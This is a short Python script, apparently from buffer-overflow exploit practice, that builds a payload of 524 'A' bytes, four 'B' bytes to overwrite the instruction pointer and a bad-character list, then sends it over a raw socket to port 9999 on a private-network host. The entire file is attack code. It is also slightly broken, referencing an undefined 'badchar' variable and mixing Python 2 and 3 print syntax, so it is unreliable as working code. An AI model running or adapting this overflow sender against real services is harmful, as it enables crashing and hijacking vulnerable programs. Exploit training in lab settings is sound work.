import sys, socket

\

buffer ="A" * 524 + "B" *4 + badchar

try: 
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('192.168.0.134',9999))
    print "Sending Exploit to remote system......."
    s.send((buffer))
    s.recv(1024)
    s.close()
             
             

except: 
       print("Unable to connect to remote server ......")
           